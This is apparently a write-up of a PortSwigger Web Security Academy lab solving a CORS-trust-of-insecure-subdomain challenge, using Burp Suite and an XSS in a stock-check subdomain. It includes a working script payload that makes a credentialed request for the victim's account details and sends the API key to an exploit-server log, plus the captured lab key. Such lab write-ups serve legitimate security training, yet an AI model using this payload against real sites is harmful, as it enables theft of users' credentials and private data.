![image](https://github.com/udayk01/Web-Security/assets/52235763/a76fdf9d-b858-42e4-a91f-63ea2d4197c4)

## Solution:

> Check intercept is off, then use Burp's browser to log in and access your account page.

![image](https://github.com/udayk01/Web-Security/assets/52235763/c9c372db-e54d-40fd-9a90-a106ffcc5f1e)

> Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.

![image](https://github.com/udayk01/Web-Security/assets/52235763/91549e3b-a114-4563-8c96-1a2f3d11d510)

> Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.

![Screenshot 2024-04-20 121847](https://github.com/udayk01/Web-Security/assets/52235763/6c3167eb-6f35-4927-a930-619a7919da32)

>> Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.

> Open a product page, click Check stock and observe that it is loaded using a HTTP URL on a subdomain.

![image](https://github.com/udayk01/Web-Security/assets/52235763/c85f3464-f747-4c76-a1c4-8a6df4c893aa)

>> Observe that the productID parameter is vulnerable to XSS.

> In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID:
```
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/0c4ab3d5-f593-46ef-94ce-4eb19e90d36d)

> Click View exploit. Observe that the exploit works - you have landed on the log page and your API key is in the URL.

![image](https://github.com/udayk01/Web-Security/assets/52235763/82af926c-028c-4f52-8053-d72d754f691d)

> Go back to the exploit server and click Deliver exploit to victim.

> Click Access log, retrieve and submit the victim's API key to complete the lab.

![image](https://github.com/udayk01/Web-Security/assets/52235763/bd0b87d7-763a-486d-998c-38b62c0c1041)

> API key: ```qTw3KY8eYU6LcVQeYdmQrF32UR1nQEDC```

![Screenshot 2024-04-20 123451](https://github.com/udayk01/Web-Security/assets/52235763/f78a21e6-1051-41c3-8404-58af295292ad)

> Lab Solved

![Screenshot 2024-04-20 123739](https://github.com/udayk01/Web-Security/assets/52235763/42933efb-2c83-466a-b313-7f23291cfd34)


